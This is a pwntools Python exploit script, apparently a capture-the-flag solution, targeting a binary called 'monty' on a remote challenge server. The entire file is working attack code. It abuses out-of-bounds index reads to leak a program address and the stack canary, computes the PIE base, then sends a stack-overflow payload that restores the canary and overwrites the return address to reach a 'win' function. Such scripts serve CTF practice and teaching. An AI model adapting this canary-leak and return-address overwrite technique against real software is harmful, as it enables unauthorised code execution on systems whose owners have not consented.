#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './monty'
elf = context.binary = ELF(exe, checksec=True)
# libc = './lib/libc.so.6'
# libc = ELF(libc, checksec=False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()

r.sendlineafter(b"index of your first peek? ", b'-3')
r.recvuntil(b'Peek 1: ')

elf_leak = int(r.recvline().strip())
elf.address = elf_leak - (0x5555555553f1 - 0x555555554000)

r.sendlineafter(b"index of your second peek? ", b'55')
r.recvuntil(b'Peek 2: ')

canary_leak = int(r.recvline().strip())

r.sendlineafter(b"Show me the lady! ", b"0")

payload = flat({
    0x18: canary_leak,
    0x28: elf.sym["win"] + 1
})

r.sendlineafter(b"Name: ", payload)

r.interactive()